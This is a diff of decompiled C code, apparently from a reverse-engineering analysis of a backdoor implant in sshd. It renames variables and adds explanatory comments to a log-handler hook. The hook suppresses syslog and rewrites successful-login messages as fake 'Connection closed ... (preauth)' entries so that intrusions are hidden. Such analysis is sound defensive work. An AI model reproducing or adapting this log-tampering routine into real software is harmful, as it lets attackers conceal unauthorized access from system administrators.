@@ -17,23 +17,23 @@
 void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
 
 {
-  char *pcVar1;
-  BOOL BVar2;
-  sshd_log_ctx_t *log_ctx_00;
-  long lVar3;
-  EncodedStringId EVar4;
-  ssize_t sVar5;
+  char *string_cursor;
+  BOOL syslog_mask_was_enabled;
+  sshd_log_ctx_t *log_ctx_state;
+  libc_imports_t *libc_imports;
+  EncodedStringId string_id;
+  ssize_t msg_len;
   long lVar6;
   long lVar7;
   ulong uVar8;
   char *pcVar9;
   undefined4 *puVar10;
   char *pcVar11;
-  char *pcVar12;
-  char *pcVar13;
-  ulong uVar14;
-  ulong uVar15;
-  byte bVar16;
+  char *host_fragment_start;
+  char *user_fragment_start;
+  ulong host_fragment_len;
+  ulong user_fragment_len;
+  u8 zero_seed;
   char rewritten_msg [320];
   sshd_log_ctx_t *log_ctx;
   log_handler_fn sshlog_impl;
@@ -59,9 +59,9 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
   char preauth_label[7];
   uchar closing_bracket_char;
   
-  bVar16 = 0;
-  log_ctx_00 = *(sshd_log_ctx_t **)(global_ctx + 0x30);
-  lVar3 = *(long *)(global_ctx + 0x10);
+  zero_seed = 0;
+  log_ctx_state = *(sshd_log_ctx_t **)(global_ctx + 0x30);
+  libc_imports = *(long *)(global_ctx + 0x10);
   filtered_host_chunk0 = 0;
   filtered_host_chunk1 = 0;
   puVar10 = filtered_host_words;
@@ -84,135 +84,140 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
     puVar10 = puVar10 + 1;
   }
   if (msg != (char *)0x0) {
-    if (log_ctx_00->log_squelched == TRUE) {
+    // AutoDoc: Respect the payload’s "logging disabled" flag—once set, every log request immediately bails.
+    if (log_ctx_state->log_squelched == TRUE) {
       return;
     }
     if (*(int *)(global_ctx + 0x90) != 0) {
       return;
     }
-    if ((log_ctx_00->saved_log_handler != (log_handler_fn)0x0) &&
-       (log_ctx_00->saved_log_handler_ctx == (void *)0x0)) {
+    if ((log_ctx_state->saved_log_handler != (log_handler_fn)0x0) &&
+       (log_ctx_state->saved_log_handler_ctx == (void *)0x0)) {
       return;
     }
-    sVar5 = c_strlen(msg);
-    pcVar1 = msg + sVar5;
+    msg_len = c_strlen(msg);
+    string_cursor = msg + msg_len;
     while( TRUE ) {
-      if (pcVar1 <= msg) {
+      if (string_cursor <= msg) {
         return;
       }
-      EVar4 = get_string_id(msg,pcVar1);
-      if (EVar4 == STR_Connection_closed_by) break;
-      if ((EVar4 == STR_Accepted_password_for) || (EVar4 == STR_Accepted_publickey_for)) {
-        pcVar13 = msg + 0x17;
-        if (EVar4 == STR_Accepted_password_for) {
-          pcVar13 = msg + 0x16;
+      string_id = get_string_id(msg,string_cursor);
+      if (string_id == STR_Connection_closed_by) break;
+      // AutoDoc: Track log lines announcing a successful authentication so the hook can harvest the username/host fragments for rewriting.
+      if ((string_id == STR_Accepted_password_for) || (string_id == STR_Accepted_publickey_for)) {
+        user_fragment_start = msg + 0x17;
+        if (string_id == STR_Accepted_password_for) {
+          user_fragment_start = msg + 0x16;
         }
-        uVar14 = 0;
-        pcVar12 = (char *)0x0;
-        uVar15 = 0;
+        host_fragment_len = 0;
+        host_fragment_start = (char *)0x0;
+        user_fragment_len = 0;
         goto LAB_0010a504;
       }
       msg = msg + 1;
     }
-    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(undefined2 *)log_ctx_00->fmt_percent_s);
-    log_ctx_00->log_squelched = TRUE;
-    if (((log_ctx_00->syslog_mask_applied != FALSE) && (lVar3 != 0)) &&
-       (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
-      (**(code **)(lVar3 + 0x58))(0xff);
+    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(undefined2 *)log_ctx_state->fmt_percent_s);
+    log_ctx_state->log_squelched = TRUE;
+    // AutoDoc: Temporarily force `setlogmask(0xff)` whenever syslog suppression is enabled so sshd’s own handler stays quiet while we inject a sanitized line.
+    if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
+       (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
+      (**(code **)(libc_imports + 0x58))(0xff);
     }
-    sshd_log(log_ctx_00,level,(char *)&prefix_chunk0,msg);
-    BVar2 = log_ctx_00->syslog_mask_applied;
+    sshd_log(log_ctx_state,level,(char *)&prefix_chunk0,msg);
+    syslog_mask_was_enabled = log_ctx_state->syslog_mask_applied;
     goto joined_r0x0010a4c2;
   }
   goto LAB_0010a6da;
 LAB_0010a504:
   do {
-    EVar4 = get_string_id(msg,pcVar1);
-    if (EVar4 == STR_ssh2) {
-      if (pcVar12 != (char *)0x0) {
-        uVar14 = (long)msg - (long)pcVar12;
-        uVar8 = uVar14;
-        pcVar9 = pcVar12;
+    string_id = get_string_id(msg,string_cursor);
+    if (string_id == STR_ssh2) {
+      if (host_fragment_start != (char *)0x0) {
+        host_fragment_len = (long)msg - (long)host_fragment_start;
+        uVar8 = host_fragment_len;
+        pcVar9 = host_fragment_start;
         pcVar11 = (char *)&filtered_host_chunk0;
-        if (0xff < uVar14) goto LAB_0010a6da;
+        if (0xff < host_fragment_len) goto LAB_0010a6da;
         for (; uVar8 != 0; uVar8 = uVar8 - 1) {
           *pcVar11 = *pcVar9;
-          pcVar9 = pcVar9 + (ulong)bVar16 * -2 + 1;
-          pcVar11 = pcVar11 + (ulong)bVar16 * -2 + 1;
+          pcVar9 = pcVar9 + (ulong)zero_seed * -2 + 1;
+          pcVar11 = pcVar11 + (ulong)zero_seed * -2 + 1;
         }
       }
     }
-    else if (EVar4 == STR_from) {
-      uVar15 = (long)msg - (long)pcVar13;
-      if (0xff < uVar15) goto LAB_0010a6da;
-      pcVar12 = msg + 6;
-      pcVar9 = pcVar13;
+    else if (string_id == STR_from) {
+      user_fragment_len = (long)msg - (long)user_fragment_start;
+      if (0xff < user_fragment_len) goto LAB_0010a6da;
+      host_fragment_start = msg + 6;
+      pcVar9 = user_fragment_start;
       pcVar11 = (char *)&user_fragment_chunk0;
-      for (uVar8 = uVar15; uVar8 != 0; uVar8 = uVar8 - 1) {
+      for (uVar8 = user_fragment_len; uVar8 != 0; uVar8 = uVar8 - 1) {
         *pcVar11 = *pcVar9;
-        pcVar9 = pcVar9 + (ulong)bVar16 * -2 + 1;
-        pcVar11 = pcVar11 + (ulong)bVar16 * -2 + 1;
+        pcVar9 = pcVar9 + (ulong)zero_seed * -2 + 1;
+        pcVar11 = pcVar11 + (ulong)zero_seed * -2 + 1;
       }
     }
     msg = msg + 1;
-  } while (msg < pcVar1);
-  if ((uVar15 != 0) && (uVar14 != 0)) {
-    pcVar1 = log_ctx_00->str_connection_closed_by;
+  } while (msg < string_cursor);
+  // AutoDoc: Only rebuild the "Connection closed by … (preauth)" string once both the username and host fragments were captured.
+  if ((user_fragment_len != 0) && (host_fragment_len != 0)) {
+    string_cursor = log_ctx_state->str_connection_closed_by;
     lVar7 = 0;
     do {
       lVar6 = lVar7 + 1;
-      *(char *)((long)&prefix_chunk0 + lVar7) = pcVar1[lVar7];
+      *(char *)((long)&prefix_chunk0 + lVar7) = string_cursor[lVar7];
       lVar7 = lVar6;
     } while (lVar6 != 0x15);
-    pcVar1 = log_ctx_00->str_authenticating;
+    string_cursor = log_ctx_state->str_authenticating;
     lVar7 = 0;
     do {
-      authenticating_label[lVar7] = pcVar1[lVar7];
+      authenticating_label[lVar7] = string_cursor[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 0xe);
     label_space = 0x20;
-    pcVar1 = log_ctx_00->str_user;
+    string_cursor = log_ctx_state->str_user;
     lVar7 = 0;
     do {
-      user_label[lVar7] = pcVar1[lVar7];
+      user_label[lVar7] = string_cursor[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 4);
     user_space = 0x20;
-    percent_s_head0 = *log_ctx_00->fmt_percent_s;
-    percent_s_head1 = log_ctx_00->fmt_percent_s[1];
+    percent_s_head0 = *log_ctx_state->fmt_percent_s;
+    percent_s_head1 = log_ctx_state->fmt_percent_s[1];
     percent_s_padding = 0x20;
-    percent_s_tail0 = *log_ctx_00->fmt_percent_s;
-    percent_s_tail1 = log_ctx_00->fmt_percent_s[1];
+    percent_s_tail0 = *log_ctx_state->fmt_percent_s;
+    percent_s_tail1 = log_ctx_state->fmt_percent_s[1];
     open_bracket_padding = 0x5b20;
-    pcVar1 = log_ctx_00->str_preauth;
+    string_cursor = log_ctx_state->str_preauth;
     lVar7 = 0;
     do {
-      preauth_label[lVar7] = pcVar1[lVar7];
+      preauth_label[lVar7] = string_cursor[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 7);
     closing_bracket_char = 0x5d;
-    log_ctx_00->log_squelched = TRUE;
-    if (((log_ctx_00->syslog_mask_applied != FALSE) && (lVar3 != 0)) &&
-       (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
-      (**(code **)(lVar3 + 0x58))(0xff);
+    log_ctx_state->log_squelched = TRUE;
+    if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
+       (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
+      (**(code **)(libc_imports + 0x58))(0xff);
     }
-    sshd_log(log_ctx_00,SYSLOG_LEVEL_INFO,(char *)&prefix_chunk0,&user_fragment_chunk0,&filtered_host_chunk0);
-    BVar2 = log_ctx_00->syslog_mask_applied;
+    sshd_log(log_ctx_state,SYSLOG_LEVEL_INFO,(char *)&prefix_chunk0,&user_fragment_chunk0,&filtered_host_chunk0);
+    syslog_mask_was_enabled = log_ctx_state->syslog_mask_applied;
 joined_r0x0010a4c2:
-    if (BVar2 == FALSE) {
+    if (syslog_mask_was_enabled == FALSE) {
       return;
     }
-    if (lVar3 == 0) {
+    if (libc_imports == 0) {
       return;
     }
-    if (*(code **)(lVar3 + 0x58) == (code *)0x0) {
+    if (*(code **)(libc_imports + 0x58) == (code *)0x0) {
       return;
     }
-    (**(code **)(lVar3 + 0x58))(0x80000000);
+    // AutoDoc: Restore sshd’s original syslog mask after the sanitized message has been emitted.
+    (**(code **)(libc_imports + 0x58))(0x80000000);
     return;
   }
 LAB_0010a6da:
-  log_ctx_00->log_squelched = TRUE;
+  log_ctx_state->log_squelched = TRUE;
   return;
 }
 
